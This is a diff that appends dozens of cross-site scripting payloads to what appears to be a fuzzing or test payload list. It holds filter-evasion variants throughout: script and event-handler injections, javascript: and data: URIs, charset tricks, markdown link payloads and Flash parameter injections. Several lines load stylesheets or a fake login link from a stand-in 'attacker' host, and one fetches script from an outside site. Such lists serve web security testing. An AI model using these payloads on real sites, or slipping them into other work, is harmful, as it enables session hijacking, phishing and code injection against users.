@@ -125,4 +125,71 @@ exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
 <A HREF="http://www.google.com/ogle.com/">XSS</A>
 javascript:alert(document.cookie)
 data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
-
+<script>var q="";alert(1)//"</script>
+<a href="javascript:alert(1)">Link</a>
+<div>`-alert(1)</script><script>`</div><div>`-alert(1)</script><script>`</div>
+<svg o<script>nload=alert(1)>
+<script>/&/-alert(1)</script>
+<body><script>hash=location.hash.slice(1);document.body.innerHTML=decodeURIComponent(hash);</script></body>
+<script>location.href=decodeURIComponent(location.hash.slice(1));</script>
+<?xml version="1.0"?><html><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></html>
+<?xml version="1.0"?><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>
+<a href=https://attacker/>Session expired. Please login again.</a>
+<style>@import '//attacker/test.css'</style>
+<link rel=stylesheet href=//attacker/test.css>
+<svg xmlns:xlink=http://www.w3.org/1999/xlink><animate xlink:href=#x attributeName="xlink:href" values="&#x3000;javascript:alert(1)" /><a id=x><rect width=100 height=100 /></a>
+[0x00][0x00][0x00][0x00][0x00][0x00][0x00]<script>alert(1)</script>
+<div><script>alert(1)--></div><script src=/test.js></script>
+<meta charset=iso-2022-jp><svg o[0x1B](Bnload=alert(1)>
+<meta charset=iso-2022-jp><script>alert(1)[0x1B]$@[0x0A]</script>
+PATH_INFO:/<link rel=import href="/bypass/path/<script>alert(1)</script>">
+</script>"><script>prompt(1)</script>
+</ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>
+"><img src=x onerror=prompt(1)>
+"><svg/onload=prompt(1)>
+"><iframe/src=javascript:prompt(1)>
+"><h1 onclick=prompt(1)>Clickme</h1>
+"><a href=javascript:prompt(1)>Clickme</a>
+"><a href="javascript:confirm%28 1%29">Clickme</a>
+"><a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+">click</a>
+"><textarea autofocus onfocus=prompt(1)>
+"><a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>
+"><script>co\u006efir\u006d`1`</script>
+"><ScRiPt>co\u006efir\u006d`1`</ScRiPt>
+"><img src=x onerror=co\u006efir\u006d`1`>
+"><svg/onload=co\u006efir\u006d`1`>
+"><iframe/src=javascript:co\u006efir\u006d%28 1%29>
+"><h1 onclick=co\u006efir\u006d(1)>Clickme</h1>
+"><a href=javascript:prompt%28 1%29>Clickme</a>
+"><a href="javascript:co\u006efir\u006d%28 1%29">Clickme</a>
+"><textarea autofocus onfocus=co\u006efir\u006d(1)>
+"><details/ontoggle=co\u006efir\u006d`1`>clickmeonchrome
+"><p/id=1%0Aonmousemove%0A=%0Aconfirm`1`>hoveme
+"><img/src=x%0Aonerror=prompt`1`>
+"><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;">
+"><h1/ondrag=co\u006efir\u006d`1`)>DragMe</h1>
+<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
+<script src="data:,alert(1)%250A-->
+<script>alert(1)</script
+<script>alert(1)%0d%0a-->%09</script
+<x>%00%00%00%00%00%00%00<script>alert(1)</script>
+<script>location.href;'javascript:alert%281%29'</script>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+\');confirm(1);//
+<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
+<meter onmouseover="alert(1)"
+'">><div><meter onmouseover="alert(1)"</div>"
+>><marquee loop=1 width=0 onfinish=alert(1)>
+<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
+<img/src=q onerror='new Function`al\ert\`1\``'>
+$.get('http://sakurity.com/jqueryxss')
+javas&#x09;cript://www.google.com/%0Aalert(1)
+[a](javascript:confirm(1))
+[a](javascript://www.google.com%0Aprompt(1))
+[a](javascript://%0d%0aconfirm(1))
+[a](javascript://%0d%0aconfirm(1);com)
+[a](javascript:window.onerror=confirm;throw%201)
+[a]: (javascript:prompt(1))
+[a]:(�javascript:alert(1))           //Add SOH Character
+ZeroClipboard.swf?id=\"))}catch(e){confirm(/XSS./.source);}//&width=500&height=500&.swf
+plupload.flash.swf?%#target%g=alert&uid%g=XSS&
